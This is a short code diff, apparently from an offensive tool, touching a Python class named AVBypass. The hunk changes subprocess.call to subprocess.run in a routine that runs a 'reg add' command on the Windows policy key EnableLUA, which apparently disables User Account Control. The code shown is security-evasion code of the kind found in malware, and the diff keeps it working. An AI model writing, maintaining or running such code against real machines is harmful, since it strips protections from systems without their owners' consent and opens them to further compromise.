@@ -98,7 +98,7 @@ class AVBypass:
             if uac_value == 0:
                 return
 
-            subprocess.call([
+            subprocess.run([
                 "reg", "add",
                 r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                 "/v", "EnableLUA",
